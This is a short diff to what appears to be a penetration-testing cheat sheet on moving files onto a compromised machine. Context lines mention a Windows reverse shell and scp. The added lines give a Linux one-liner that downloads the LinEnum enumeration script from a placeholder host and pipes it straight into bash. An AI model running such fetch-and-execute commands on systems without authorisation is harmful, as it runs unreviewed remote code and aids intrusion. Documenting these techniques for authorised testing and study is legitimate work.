@@ -78,3 +78,8 @@ Now in your Windows bind/reverse shell run the ftp.txt file
 scp filename username@ipaddress
 # Then enter password at prompt
 ```
+---
+#### Transferring and running a file on linux
+```
+curl -s http://<hostip>/LinEnum.sh | bash
+```
